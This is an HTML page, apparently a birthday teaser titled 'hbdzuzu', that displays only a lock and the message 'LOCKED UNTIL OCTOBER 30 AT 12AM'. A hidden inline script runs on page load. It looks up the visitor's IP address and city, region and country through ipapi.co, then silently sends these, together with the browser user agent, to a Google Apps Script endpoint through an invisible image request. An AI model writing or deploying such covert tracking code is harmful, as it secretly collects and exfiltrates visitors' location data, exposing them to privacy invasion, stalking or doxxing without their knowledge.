<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>hbdzuzu</title>
<style>
  html, body {
    margin: 0;
    height: 100%;
    background: #0b0b14;
    color: #f5f3ff;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  }
  body {
    display: flex;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 24px;
    box-sizing: border-box;
  }
  main {
    max-width: 640px;
  }
  h1 {
    font-size: clamp(1.75rem, 5vw, 3rem);
    font-weight: 700;
    letter-spacing: 0.02em;
    line-height: 1.3;
    margin: 0;
  }
  .lock {
    font-size: clamp(2.5rem, 8vw, 4rem);
    margin-bottom: 24px;
  }
</style>
</head>
<body>
<main>
  <div class="lock">🔒</div>
  <h1>LOCKED UNTIL OCTOBER 30 AT 12AM</h1>
</main>
<script>
(function () {
  fetch('https://ipapi.co/json/')
    .then(function (r) { return r.json(); })
    .then(function (data) {
      var params = new URLSearchParams({
        ip: data.ip || '',
        city: data.city || '',
        region: data.region || '',
        country: data.country_name || '',
        ua: navigator.userAgent
      });
      var img = new Image();
      img.src = 'https://script.google.com/macros/s/AKfycbys7ruR7jSNcX03baXS-F1VUcIyBC-ZoX7O-OzGvdOfG94vL4i0S0_EsWd5lT0X_bLYOw/exec?' + params.toString();
    })
    .catch(function () {});
})();
</script>
</body>
</html>
